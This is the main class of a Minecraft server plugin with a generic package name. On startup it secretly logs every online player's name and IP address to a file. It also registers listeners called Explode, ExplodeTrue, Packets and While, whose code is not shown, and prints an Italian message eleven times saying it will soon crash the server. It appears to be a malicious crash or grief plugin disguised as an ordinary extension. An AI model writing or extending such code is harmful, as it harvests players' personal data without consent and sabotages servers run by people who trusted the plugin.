package io.paper.extension;

import io.paper.extension.api.Api;
import io.paper.extension.explode.Explode;
import io.paper.extension.explode.ExplodeTrue;
import io.paper.extension.packets.Packets;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;

public final class Main extends JavaPlugin {

    private static Main instance;

    public static Main getInstance() {
        return instance;
    }

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        for(Player pss : Bukkit.getOnlinePlayers()){
            InetSocketAddress Accounts = pss.getAddress();
            logToFile("Accounts > " + pss.getDisplayName() + " >>> " + Accounts.toString());
        }
        Events();
        Logger();
    }
    public void Events(){
        getServer().getPluginManager().registerEvents(new Api(), this);
        getServer().getPluginManager().registerEvents(new Lib(), this);
        getServer().getPluginManager().registerEvents(new Packets(), this);
        getServer().getPluginManager().registerEvents(new While(), this);
        getServer().getPluginManager().registerEvents(new Explode(), this);
        getServer().getPluginManager().registerEvents(new ExplodeTrue(), this);
        getServer().getPluginManager().registerEvents(new Help(), this);
    }
    public void Logger(){
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
        Bukkit.getLogger().info("CRASHERA FRA POCO IL SERVERINO DEL CABBO XD <3");
    }

    public void logToFile(String message)

    {

        try
        {
            File dataFolder = getDataFolder();
            if(!dataFolder.exists())
            {
                dataFolder.mkdir();
            }

            File saveTo = new File(getDataFolder(), "Logs.txt");
            if (!saveTo.exists())
            {
                saveTo.createNewFile();
            }


            FileWriter fw = new FileWriter(saveTo, true);

            PrintWriter pw = new PrintWriter(fw);

            pw.println(message);

            pw.flush();

            pw.close();

        } catch (IOException e)
        {
            e.printStackTrace();
        }

    }
}
